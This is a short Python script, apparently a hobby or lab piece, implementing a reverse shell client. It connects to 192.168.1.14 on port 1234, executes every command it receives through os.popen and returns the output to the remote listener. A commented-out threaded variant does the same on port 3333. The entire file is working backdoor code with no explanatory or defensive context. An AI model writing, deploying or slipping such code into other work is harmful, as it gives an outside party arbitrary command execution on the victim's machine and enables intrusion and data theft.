import os
"""import socket
import threading"""
from socket import *

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.1.14", 1234))
while True:
    data = client.recv(2048).decode()

    if data == "exit":
        client.close()
        break

    result = os.popen(data).read()
    client.sendall(result.encode())

"""def outgoing():
    while True:
        data = input("[+] You > ")
        client.sendall(data.encode())

        if data == "exit":
            client.close()
            break
def incoming():
    while True:
        try:

            data = client.recv(2048).decode()
            if data:
                print(data)
            else:
                pass
        finally:
            result = os.popen(data).read()
            client.sendall(result.encode())

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.1.14", 3333))
client.setblocking(0)
t1=threading.Thread(target=outgoing)
t2=threading.Thread(target=incoming)
t1.start()
t2.start()"""